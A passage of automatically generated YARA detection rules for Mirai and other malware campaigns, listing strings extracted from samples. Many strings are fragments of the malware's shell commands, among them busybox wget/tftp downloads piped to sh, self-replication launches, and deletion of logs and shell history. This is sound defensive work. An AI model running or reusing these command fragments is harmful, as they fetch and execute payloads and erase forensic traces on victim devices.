        $s3 = "mig.sh http://$H/bins/kla.sh 2>/dev/null ||    busybox wget -q -O .mig.sh http://$H/bins/kla.sh 2>/d" ascii
        $s4 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s5 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s6 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s7 = "chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@ope" ascii
        $s8 = "group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group14-sha256" ascii
        $s9 = "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8" ascii
        $s10 = "en sh .mig.sh 2>/dev/null; rm -f .mig.sh 2>/dev/null; break; fi; done; rm -f .mig.sh 2>/dev/null" ascii
        $s11 = "SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_563f36e7_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-563f36e7"
        date = "2026-10-24"
        campaign = "tlsh-563f36e7"
        family = "mirai"
        hash = "00d0db4d3dbc46ce64f493b6d0df48a2c8e3b2c4c514a1f5159b8d2c8828cb8f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-563f36e7.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,diffie-hellman-" ascii
        $s1 = "mig.sh http://$H/bins/kla.sh 2>/dev/null ||    busybox wget -q -O .mig.sh http://$H/bins/kla.sh 2>/d" ascii
        $s2 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s3 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s4 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s5 = "chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@ope" ascii
        $s6 = "group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group14-sha256" ascii
        $s7 = "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8" ascii
        $s8 = "en sh .mig.sh 2>/dev/null; rm -f .mig.sh 2>/dev/null; break; fi; done; rm -f .mig.sh 2>/dev/null" ascii
        $s9 = "SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3" ascii
        $s10 = "umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@ope" ascii
        $s11 = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_31dd621e_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-31dd621e"
        date = "2026-10-24"
        campaign = "tlsh-31dd621e"
        family = "mirai"
        hash = "103a43615769b391c9db64c43d48b02247da7563f15ec5f7e5ec8c9ee24715c7"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-31dd621e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,diffie-hellman-" ascii
        $s1 = "mig.sh http://$H/bins/kla.sh 2>/dev/null ||    busybox wget -q -O .mig.sh http://$H/bins/kla.sh 2>/d" ascii
        $s2 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s3 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s4 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s5 = "chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@ope" ascii
        $s6 = "group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group14-sha256" ascii
        $s7 = "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8" ascii
        $s8 = "en sh .mig.sh 2>/dev/null; rm -f .mig.sh 2>/dev/null; break; fi; done; rm -f .mig.sh 2>/dev/null" ascii
        $s9 = "SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3" ascii
        $s10 = "umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@ope" ascii
        $s11 = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_5b7aa1cb_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-5b7aa1cb"
        date = "2026-10-24"
        campaign = "tlsh-5b7aa1cb"
        family = "mirai"
        hash = "0a2d1fe2f32d8c6f1adb5ffe9c767037c47870ffdff54373dfa7d6d0e9712cc6"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-5b7aa1cb.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,diffie-hellman-" ascii
        $s1 = "mig.sh http://$H/bins/kla.sh 2>/dev/null ||    busybox wget -q -O .mig.sh http://$H/bins/kla.sh 2>/d" ascii
        $s2 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s3 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s4 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s5 = "chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@ope" ascii
        $s6 = "group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group14-sha256" ascii
        $s7 = "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8" ascii
        $s8 = "GCC: (GNU) 3.3.2 20031005 (Debian prerelease)" ascii
        $s9 = "en sh .mig.sh 2>/dev/null; rm -f .mig.sh 2>/dev/null; break; fi; done; rm -f .mig.sh 2>/dev/null" ascii
        $s10 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/ieee754-df.S" ascii
        $s11 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/lib1funcs.asm" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 3 of them
}

rule Sightlines_imphash_15c59c97_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-15c59c97"
        date = "2026-10-24"
        campaign = "imphash-15c59c97"
        family = ""
        hash = "052a2258a185f4c858326ff1a5754b2c4c2bf680c12ebf30a3c2b2b9c1af8f68"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-15c59c97.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "host.UI.RawUI.BufferSize = new-object System.Management.Automation.Host.Size(1024,50);\" \"&\"\"%s\"\"\" 2>" wide
        $s1 = ".?AV<lambda_1>@?1??OnPropChanged@WinRTControlBase@@AAE_NABVEvent@exui@@@Z@" ascii
        $s2 = ".?AV<lambda_1>@?1??UpdateFromProperty@ComboBoxControlWinRT@@UAE_NXZ@" ascii
        $s3 = "Caphyon\\Advanced Installer\\[ProductCode]\\[AI_EXTERNALUIUNINSTALLERNAME]" wide
        $s4 = ".?AV<lambda_1>@?1??UpdateWindowText@TextControlWinRT@@UAEXABV?$basic_string@_WU?$char_traits@_W@std@" ascii
        $s5 = ".?AV<lambda_1>@?1??InitControl@CheckBoxControlWinRT@@UAEXXZ@" ascii
        $s6 = ".?AV<lambda_1>@?1??SetAsDefaultButton@ImageButtonControlWinRT@@EAE_N_N@Z@" ascii
        $s7 = ".?AV<lambda_1>@?1??SetAsDefaultButton@PushButtonControlWinRT@@EAE_N_N@Z@" ascii
        $s8 = ".?AV<lambda_1>@?6??OnDdx@WinRTControlBase@@AAE_NABVEvent@exui@@@Z@" ascii
        $s9 = ".?AV<lambda_1>@?1??ShowControl@WinRTControlBase@@UAEX_N@Z@" ascii
        $s10 = ".?AV<lambda_1>@?1??DoSaveData@ComboBoxControlWinRT@@UAE_NXZ@" ascii
        $s11 = ".?AV<lambda_1>@?1??SetPos@ProgressBarWinRT@@UAEXI@Z@" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 27452032 and 12 of them
}

rule Sightlines_tlsh_cb1511c4_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-cb1511c4"
        date = "2026-10-24"
        campaign = "tlsh-cb1511c4"
        family = "mirai"
        hash = "152dc9cbc719596a18b8f7f4ce8ab89cb6c9c3f747cc7f06a2121480d5c91d8d"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-cb1511c4.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "GCC: (GNU) 3.3.2 20031005 (Debian prerelease)" ascii
        $s1 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/lib1funcs.asm" ascii
        $s2 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/pr-support.c" ascii
        $s3 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/libunwind.S" ascii
        $s4 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/unwind-arm.c" ascii
        $s5 = "/home/landley/aboriginal/aboriginal/build/simple-cross-compiler-armv7l/bin/../cc/include" ascii
        $s6 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/build-gcc/gcc" ascii
        $s7 = "__do_global_dtors_aux_fini_array_entry" ascii
        $s8 = "phase2_call_unexpected_after_unwind" ascii
        $s9 = "_Unwind_GetLanguageSpecificData" ascii
        $s10 = "_Unwind_VRS_DataRepresentation" ascii
        $s11 = "__gnu_Unwind_Resume_or_Rethrow" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 6 of them
}

rule Sightlines_tlsh_93c63586_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-93c63586"
        date = "2026-10-24"
        campaign = "tlsh-93c63586"
        family = "mirai"
        hash = "05fc0e8dc8e4f37ea41415c40052d36b941d2f3a42e59b0b42420089e17107ed"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-93c63586.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/bin/busybox chmod +x .d; ./.d; ./dvrHelper selfrep" ascii
        $s1 = " -r tftp.sh -l- | sh;/bin/busybox ftpget " ascii
        $s2 = "/wget.sh -O- | sh;/bin/busybox tftp -g " ascii
        $s3 = " ftpget.sh ftpget.sh && sh ftpget.sh;curl http://" ascii
        $s4 = "Content-Type: application/json" ascii
        $s5 = "/bin/busybox hostname PBOC" ascii
        $s6 = "GET /api/v1/status HTTP/1.1" ascii
        $s7 = "/bin/busybox wget http://" ascii
        $s8 = "POST /api/sync HTTP/1.1" ascii
        $s9 = "/bin/busybox echo -ne " ascii
        $s10 = "/bin/busybox echo > " ascii
        $s11 = "Host: api.svc.local" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 5 of them
}

rule Sightlines_tlsh_85cfbe91_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-85cfbe91"
        date = "2026-10-24"
        campaign = "tlsh-85cfbe91"
        family = "mirai"
        hash = "0e1bef0a80af04a033f0e9f29b9b97475b65503ec559af5826fe2af45edba7e8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-85cfbe91.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/bin/busybox chmod +x .d; ./.d; ./dvrHelper selfrep" ascii
        $s1 = " -r tftp.sh -l- | sh;/bin/busybox ftpget " ascii
        $s2 = "/wget.sh -O- | sh;/bin/busybox tftp -g " ascii
        $s3 = " ftpget.sh ftpget.sh && sh ftpget.sh;curl http://" ascii
        $s4 = "Content-Type: application/json" ascii
        $s5 = "/bin/busybox hostname PBOC" ascii
        $s6 = "GET /api/v1/status HTTP/1.1" ascii
        $s7 = "/bin/busybox wget http://" ascii
        $s8 = "POST /api/sync HTTP/1.1" ascii
        $s9 = "/bin/busybox echo -ne " ascii
        $s10 = "qVcVf(@Vg= Vhm#Vi}&Vj" ascii
        $s11 = "/bin/busybox echo > " ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 11 of them
}

rule Sightlines_tlsh_a944dfa7_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-a944dfa7"
        date = "2026-10-24"
        campaign = "tlsh-a944dfa7"
        family = "mirai"
        hash = "0ae443812b68a5c137afaedcec6a1afed8864baacc48e96846a13e3db07074f8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-a944dfa7.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/bin/busybox chmod +x .d; ./.d; ./dvrHelper selfrep" ascii
        $s1 = " -r tftp.sh -l- | sh;/bin/busybox ftpget " ascii
        $s2 = "/wget.sh -O- | sh;/bin/busybox tftp -g " ascii
        $s3 = " ftpget.sh ftpget.sh && sh ftpget.sh;curl http://" ascii
        $s4 = "Content-Type: application/json" ascii
        $s5 = "/bin/busybox hostname PBOC" ascii
        $s6 = "GET /api/v1/status HTTP/1.1" ascii
        $s7 = "/bin/busybox wget http://" ascii
        $s8 = "POST /api/sync HTTP/1.1" ascii
        $s9 = "/bin/busybox echo -ne " ascii
        $s10 = "/bin/busybox echo > " ascii
        $s11 = "Host: api.svc.local" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 11 of them
}

rule Sightlines_tlsh_fc20c6bb_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-fc20c6bb"
        date = "2026-10-24"
        campaign = "tlsh-fc20c6bb"
        family = "mirai"
        hash = "0b70ad78aaf9dff31b712f91cee5d1dfae0c8378f67b5fdac27625c07ce092ee"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-fc20c6bb.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/bin/busybox chmod +x .d; ./.d; ./dvrHelper selfrep" ascii
        $s1 = " -r tftp.sh -l- | sh;/bin/busybox ftpget " ascii
        $s2 = "/wget.sh -O- | sh;/bin/busybox tftp -g " ascii
        $s3 = " ftpget.sh ftpget.sh && sh ftpget.sh;curl http://" ascii
        $s4 = "Content-Type: application/json" ascii
        $s5 = "/bin/busybox hostname PBOC" ascii
        $s6 = "GET /api/v1/status HTTP/1.1" ascii
        $s7 = "/bin/busybox wget http://" ascii
        $s8 = "POST /api/sync HTTP/1.1" ascii
        $s9 = "/bin/busybox echo -ne " ascii
        $s10 = "/bin/busybox echo > " ascii
        $s11 = "Host: api.svc.local" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 5 of them
}

rule Sightlines_tlsh_a8fb433e_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-a8fb433e"
        date = "2026-10-24"
        campaign = "tlsh-a8fb433e"
        family = "mirai"
        hash = "03ff23bec6ef5c598dd1bbda72b789d0de03a3d6014fd3ba336d78cb6c4bc073"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-a8fb433e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "mHoIJPqGRSTUVWXL\\s]Yrp|{nzt[D&'()*+,-./0123456789:;<=@A%$FuvwxyE}~l" ascii
        $s1 = "/bin/busybox chmod +x .d; ./.d; ./dvrHelper selfrep" ascii
        $s2 = " -r tftp.sh -l- | sh;/bin/busybox ftpget " ascii
        $s3 = "/wget.sh -O- | sh;/bin/busybox tftp -g " ascii
        $s4 = " ftpget.sh ftpget.sh && sh ftpget.sh;curl http://" ascii
        $s5 = "Content-Type: application/json" ascii
        $s6 = "/bin/busybox hostname PBOC" ascii
        $s7 = "GET /api/v1/status HTTP/1.1" ascii
        $s8 = "/bin/busybox wget http://" ascii
        $s9 = "POST /api/sync HTTP/1.1" ascii
        $s10 = "/bin/busybox echo -ne " ascii
        $s11 = "/bin/busybox echo > " ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 11 of them
}

rule Sightlines_imphash_899539c0_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-899539c0"
        date = "2026-10-17"
        campaign = "imphash-899539c0"
        family = ""
        hash = "082ae04ff9306111505f1fcdbef1aca226d2c02f05cd4300374fa64f58a99778"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-899539c0.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "b;BC!:5j~cSR9aZknE0#Qwe'V,3I@vApf*i6<1tF]&rql$OPgsHxDMNJ%.zL_7-mJDDDDCs;aR;F9SE,!6M60.nDxPe####i!ql&" ascii
        $s1 = "PvlxQ$*x<1gDP*<gMs*V0N60iiis3n-,FZ_.xj$~$..-RLLLS%]Q0~O#EVf'zI&wi~reI<*PPAOOO7FEc<q,~!C*CB&reduction" ascii
        $s2 = "S:,,lrzR%~~~':I1Zv&6v.D6j;qfA%N1O,OscSJjjje!9iA~L1IQx*tbJp$!]6$'j:pNt<<<<x*Cmr*j_zwcbQIV#part come k" ascii
        $s3 = "ZNi*ccQnqRRR3~l]i@z<sgJt,j%F0eqREf-esNqF;~.gwDQQQ6:rOqv~OrnB6PSrrr.FsC;Lb:fIp:cFk_b6n:*x'BcIA!bFVm3r" ascii
        $s4 = "p@@@@q,ADx1;.B;kJIvZ<l@@tjN555wm3*_xq*&Ot&3RC:\\ProgramData\\lancer\\scruiaghaps.pdfOLqqqz]9!H!9jskAJ3R" ascii
        $s5 = "lztI3C~w:::QBgA@ZxAIM%ED1xARNs::qrz;----aLa3!#l0:j$e7m63MS-wVR;SzzzcJv#ECO'ER6wcN]#EIpB_PPe&Jt0gmvQb" ascii
        $s6 = "\\PLqqqz]9~B_3!En'5.IVjHNRqsbAnF%tNNN:H<0$LinajI;QJ$Z9t]IJ!DDDCspaR7iaS<Fb6Qiaz1fDDjrz:HBBBEmwf,kNIVJ" ascii
        $s7 = "-l___R.C'B.AQ0$BVr7*w9_maHf7vvvl3b%#3~JxHn]9Zn.xZ5z6s'qOJ!DDDCspaR7iaS<Fb6Qiaz1fDDFrzliteral because" ascii
        $s8 = "tQ<<<x*5_I$vbqD07H1nm<<qaQEEEEfZ~qFS.OVi;@b0Ml';ERC:\\ProgramData\\Wireshark\\mcneauspuosh]1111Di@mLAaB" ascii
        $s9 = "cJ1#EC]#nr$5&3]#bqtzz<rzjnbbbk7*@JE1@17*@k7g'NcPve.<'m71ItaHA';D,p*<'N$1An-:0BBBEmsv~'6p,0MZsigI~xOB" ascii
        $s10 = "AO5!!!!#;'pzv%*zcNvQ~CHv3333&'EDg#BJ*qS1cI-MfS3.ln$aaa@SQt<Afq<3;tl-zp65x]7aazOpenFileRequiringGestu" ascii
        $s11 = "S!@R0lpaS@V!S#xtBRfRIIIrVAJ;g_%*gAN3V~J*fkMs<jDzQvMHl~xHII9LUFA Combined Mass Storage Device#gnnnpa'" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1294336 and 12 of them
}

rule Sightlines_tlsh_ae2cdc46_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-ae2cdc46"
        date = "2026-10-24"
        campaign = "tlsh-ae2cdc46"
        family = "mirai"
        hash = "01e5360067eb757682085ff66939c7190edbcab62cd00153b1e10ff6be9945e8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-ae2cdc46.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/bin/busybox chmod +x .d; ./.d; ./dvrHelper selfrep" ascii
        $s1 = " -r tftp.sh -l- | sh;/bin/busybox ftpget " ascii
        $s2 = "/wget.sh -O- | sh;/bin/busybox tftp -g " ascii
        $s3 = " ftpget.sh ftpget.sh && sh ftpget.sh;curl http://" ascii
        $s4 = "Content-Type: application/json" ascii
        $s5 = "/bin/busybox hostname PBOC" ascii
        $s6 = "GET /api/v1/status HTTP/1.1" ascii
        $s7 = "/bin/busybox wget http://" ascii
        $s8 = "POST /api/sync HTTP/1.1" ascii
        $s9 = "/bin/busybox echo -ne " ascii
        $s10 = "/bin/busybox echo > " ascii
        $s11 = "Unknown error Success" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 5 of them
}

rule Sightlines_tlsh_e69583c9_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-e69583c9"
        date = "2026-10-24"
        campaign = "tlsh-e69583c9"
        family = "mirai"
        hash = "69f5e308a0de8e4f8bd5793ab2403b8598f287354febdb85520002d8ef39feba"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-e69583c9.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,diffie-hellman-" ascii
        $s1 = "mig.sh http://$H/bins/kla.sh 2>/dev/null ||    busybox wget -q -O .mig.sh http://$H/bins/kla.sh 2>/d" ascii
        $s2 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s3 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s4 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s5 = "chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@ope" ascii
        $s6 = "group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group14-sha256" ascii
        $s7 = "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8" ascii
        $s8 = "en sh .mig.sh 2>/dev/null; rm -f .mig.sh 2>/dev/null; break; fi; done; rm -f .mig.sh 2>/dev/null" ascii
        $s9 = "SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3" ascii
        $s10 = "umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@ope" ascii
        $s11 = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_9740e9d9_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-9740e9d9"
        date = "2026-10-24"
        campaign = "imphash-9740e9d9"
        family = ""
        hash = "178625c3c3bb7d6f77c95b6a11ce0ff09e2d2dbefd0be07babfa369f3a1670e3"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-9740e9d9.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" ascii
        $s1 = "        <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/>" ascii
        $s2 = "        <supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/>" ascii
        $s3 = "        <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/>" ascii
        $s4 = "        <supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/>" ascii
        $s5 = "        <supportedOS Id=\"{e2011457-1546-43c5-a5fe-008deee3d3f0}\"/>" ascii
        $s6 = "FastMM Borland Edition (c) 2004 - 2008 Pierre le Riche / Professional Software Development" ascii
        $s7 = "For more detailed information, please visit http://www.jrsoftware.org/ishelp/index.php?topic=setupcm" wide
        $s8 = "<compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">" ascii
        $s9 = "/MERGETASKS=\"comma separated list of task names\"" wide
        $s10 = "/COMPONENTS=\"comma separated list of component names\"" wide
        $s11 = "<trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 37012450 and 12 of them
}

rule Sightlines_tlsh_54e23a64_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-54e23a64"
        date = "2026-10-21"
        campaign = "tlsh-54e23a64"
        family = ""
        hash = "0254d77fb5b0561bc5a2e9a01cf47e8387f73adb9e18ff336867186c89cd660f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-54e23a64.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/usr/lib/libSystem.B.dylib" ascii
        $s1 = "_realpath$DARWIN_EXTSN" ascii
        $s2 = "__mh_execute_header" ascii
        $s3 = "___stack_chk_guard" ascii
        $s4 = "____chkstk_darwin" ascii
        $s5 = "___stack_chk_fail" ascii
        $s6 = "/tmp/log_de.log" ascii
        $s7 = "_gethostbyname" ascii
        $s8 = "/tmp/.X1-unix" ascii
        $s9 = "[kworker/0:2]" ascii
        $s10 = "/usr/lib/dyld" ascii
        $s11 = "__unwind_info" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_3729e6a6_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-3729e6a6"
        date = "2026-10-24"
        campaign = "tlsh-3729e6a6"
        family = "mirai"
        hash = "094d5ce77acf6798063dc7a58af69ea57f33f531bb3aa928f478d690031f29fd"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-3729e6a6.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/etc/config/resolv.conf" ascii
        $s1 = "/etc/config/hosts" ascii
        $s2 = "/proc/%d/exe" ascii
        $s3 = "Cx}1Kx}PSxK" ascii
        $s4 = "x}'Kx}j[x8" ascii
        $s5 = "}CX.}CSxN" ascii
        $s6 = "}CSx}e[x" ascii
        $s7 = "}e[x}CSx" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 7 of them
}

rule Sightlines_tlsh_648af410_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-648af410"
        date = "2026-10-24"
        campaign = "tlsh-648af410"
        family = ""
        hash = "1c2972ea59fa21f1fb23e5ef294630d38f238e3edde70dd67a9ac0aef5bbee05"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-648af410.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "history -c 2>/dev/null; rm -f ~/.bash_history 2>/dev/null" ascii
        $s1 = "x-svc|dropbear-agent|iptables-helper|sysd' 2>/dev/null" ascii
        $s2 = "pkill -9 -f 'kworker-helper|dhcpcd-monitor|ntpd-sync|udevd-helper|syslogd-rotate|crond-helper|netlin" ascii
        $s3 = "svc dropbear-agent iptables-helper sysd 2>/dev/null" ascii
        $s4 = "k-monitor|mdev-trigger|avahi-helper|dbus-monitor|logrotate-svc|tmpfiles-clean|resolved-helper|busybo" ascii
        $s5 = "monitor mdev-trigger avahi-helper dbus-monitor logrotate-svc tmpfiles-clean resolved-helper busybox-" ascii
        $s6 = "killall -9 kworker-helper dhcpcd-monitor ntpd-sync udevd-helper syslogd-rotate crond-helper netlink-" ascii
        $s7 = "    if command -v wget >/dev/null 2>&1; then" ascii
        $s8 = "    if command -v curl >/dev/null 2>&1; then" ascii
        $s9 = "    if command -v tftp >/dev/null 2>&1; then" ascii
        $s10 = "    for WD in /dev/watchdog /dev/watchdog0 /dev/misc/watchdog; do" ascii
        $s11 = "    rm -f /var/log/messages /var/log/syslog /var/log/auth.log /var/log/secure /var/log/wtmp 2>/dev/n" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_a2e5f911_remusstealer
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-a2e5f911"
        date = "2026-10-21"
        campaign = "imphash-a2e5f911"
        family = "remusstealer"
        hash = "06e8c194b2dfce2771dd27e0b8c029497ca6617e5719297cf39f08007e46ad45"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-a2e5f911.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "CreateDesktopW" ascii
        $s1 = "f~}iaa|wH" ascii
        $s2 = "LA@fF;LD" ascii
        $s3 = "L$xL;L$X" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 4 of them
}

rule Sightlines_contacted_0ad9e3c5_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign contacted-0ad9e3c5"
        date = "2026-10-23"
        campaign = "contacted-0ad9e3c5"
        family = ""
        hash = "1a6accff44320788df5d4aaa5befd1aa524ca24715f76155eaf9558b5acdb0d0"
